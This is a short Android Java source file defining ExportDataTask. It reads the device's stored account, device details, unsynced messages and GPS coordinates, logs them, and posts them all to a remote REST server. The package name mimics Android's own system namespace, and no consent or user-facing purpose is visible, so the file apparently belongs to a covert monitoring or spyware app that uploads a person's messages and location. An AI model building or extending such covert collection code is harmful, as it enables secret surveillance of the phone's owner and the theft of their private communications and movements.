package android.service.app.rest;

import android.annotation.TargetApi;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.service.app.db.DataBridge;
import android.service.app.db.DatabaseHelper;
import android.service.app.db.data.Gps;
import android.service.app.db.data.Message;
import android.service.app.db.inventory.Device;
import android.service.app.db.user.Account;
import android.service.app.json.RestBridge;
import android.service.app.utils.Log;

import java.util.Set;

@TargetApi(Build.VERSION_CODES.CUPCAKE)
public class ExportDataTask<Input> extends AsyncTask<Input, Void, SyncOutput>
{
    private final DatabaseHelper localDatabase;
    private final CallbackHandler<SyncOutput> handler;
    private final DataBridge restBridge;
    public ExportDataTask(DatabaseHelper localDatabase, Context context, CallbackHandler<SyncOutput> handler)
    {
        this.localDatabase = localDatabase;
        this.handler = handler;
        this.restBridge = new RestBridge(context);
    }

    @SafeVarargs
    protected final SyncOutput doInBackground(Input... voids)
    {
        try
        {
            Account account = localDatabase.wrapForRead(DatabaseHelper.ACCOUNT).getFirst();
            Device device = localDatabase.wrapForRead(DatabaseHelper.DEVICE).getFirst();
            Set<Message> actualMessagesBySync = localDatabase.wrapForRead(DatabaseHelper.MESSAGE).getActualBySync();
            Set<Gps> actualCoordinatesBySync = localDatabase.wrapForRead(DatabaseHelper.GPS).getActualBySync();

            Log.v("account=" + account);
            Log.v("device=" + device);
            Log.v("actualMessagesBySync=" + actualMessagesBySync);
            Log.v("actualCoordinatesBySync=" + actualCoordinatesBySync);

            restBridge.postAccount(account);
            restBridge.postDevice(device);
            restBridge.postMessages(actualMessagesBySync);
            restBridge.postGps(actualCoordinatesBySync);
        } catch (Exception e)
        {
            e.printStackTrace();
            return new SyncOutput("e: " + e.getMessage());
        }

        return new SyncOutput("success");
    }

    @Override
    protected void onPostExecute(SyncOutput result)
    {
        handler.handle(result);
    }
}
